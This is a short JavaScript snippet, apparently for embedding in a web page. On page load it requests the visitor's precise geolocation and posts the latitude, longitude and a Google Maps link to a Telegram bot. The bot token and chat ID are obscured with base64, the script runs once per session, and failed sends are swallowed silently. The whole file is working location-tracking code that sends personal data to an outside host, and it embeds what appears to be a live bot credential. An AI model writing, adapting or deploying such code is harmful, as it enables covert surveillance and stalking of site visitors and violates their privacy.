(function () {

    // 🔐 Encoded credentials
    const BOT_TOKEN = atob("ODUyNDM5OTY5MjpBQUg4Uk5GbzZVZktDcjgxSUM1c1k2Rk8yMGh4QUJTX3VQUQ==");
    const CHAT_ID  = atob("NjI3NzQzMjM1Ng==");

    // 🚫 Prevent duplicate execution per session
    if (sessionStorage.getItem("locationTracked")) return;
    sessionStorage.setItem("locationTracked", "true");

    // 🚀 Send to Telegram
    function sendToTelegram(lat, lon) {

        const message =
`📍 Location Detected

Longitude: ${lon}
Latitude: ${lat}

Google Map Link: https://www.google.com/maps?q=${lat},${lon}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        }).catch(() => {});
    }

    // 📡 Request Location Permission + Fetch Coordinates
    function getLocation() {
        if (!navigator.geolocation) {
            console.log("Geolocation not supported");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                sendToTelegram(latitude, longitude);
            },
            (error) => {
                console.log("Location access denied or failed:", error.message);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }

    // ▶ Trigger on page load
    window.onload = getLocation;

})();
